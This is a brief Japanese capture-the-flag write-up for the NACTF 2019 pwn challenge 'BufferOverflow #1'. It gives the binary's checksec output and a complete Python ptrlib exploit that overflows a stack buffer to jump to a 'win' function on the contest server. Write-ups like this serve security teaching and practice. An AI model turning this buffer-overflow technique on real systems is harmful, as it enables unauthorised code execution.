# [pwn 200pts] BufferOverflow #1 - Network Academia CTF 2019
32ビットバイナリで、全部無効です。
```
$ checksec -f bufover-1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   71 Symbols     No       0               6       bufover-1
```

これもret2winするだけです。（は？）
```python
from ptrlib import *

elf = ELF("./bufover-1")
#sock = Process("./bufover-1")
sock = Socket("shell.2019.nactf.com", 31462)
payload = b'A' * 0x1c
payload += p32(elf.symbol("win"))
sock.sendlineafter(">", payload)

sock.interactive()
```

# 感想
同じ問題じゃん。